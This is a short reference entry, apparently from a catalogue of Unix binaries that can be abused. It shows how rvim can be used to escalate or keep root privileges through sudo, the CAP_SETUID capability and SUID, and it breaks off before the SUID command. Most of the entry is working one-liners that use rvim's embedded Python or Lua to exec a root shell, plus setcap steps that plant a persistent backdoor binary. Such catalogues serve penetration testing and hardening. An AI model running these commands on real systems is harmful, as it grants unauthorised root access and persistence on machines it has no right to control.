***** Sudo *****
If the binary is allowed to run as superuser by sudo, it does not drop the
elevated privileges and may be used to access the file system, escalate or
maintain privileged access.
    * This requires that rvim is compiled with Python support. Prepend :py3 for
      Python 3.
      sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec
      sh")'
    * This requires that rvim is compiled with Lua support.
      sudo rvim -c ':lua os.execute("reset; exec sh")'
***** Capabilities *****
If the binary has the Linux CAP_SETUID capability set or it is executed by
another binary with the capability set, it can be used as a backdoor to
maintain privileged access by manipulating its own process UID.
    * This requires that rvim is compiled with Python support. Prepend :py3 for
      Python 3.
      cp $(which rvim) .
      sudo setcap cap_setuid+ep rvim

      ./rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c",
      "reset; exec sh")'
***** Limited SUID *****
If the binary has the SUID bit set, it may be abused to access the file system,
escalate or maintain access with elevated privileges working as a SUID
backdoor. If it is used to run commands (e.g., via system()-like invocations)
it only works on systems like Debian (<= Stretch) that allow the default sh
shell to run with SUID privileges.
This example creates a local SUID copy of the binary and runs it to maintain
elevated privileges. To interact with an existing SUID binary skip the first
command and run the program using its original path.
    * This requires that rvim is compiled with Lua support.
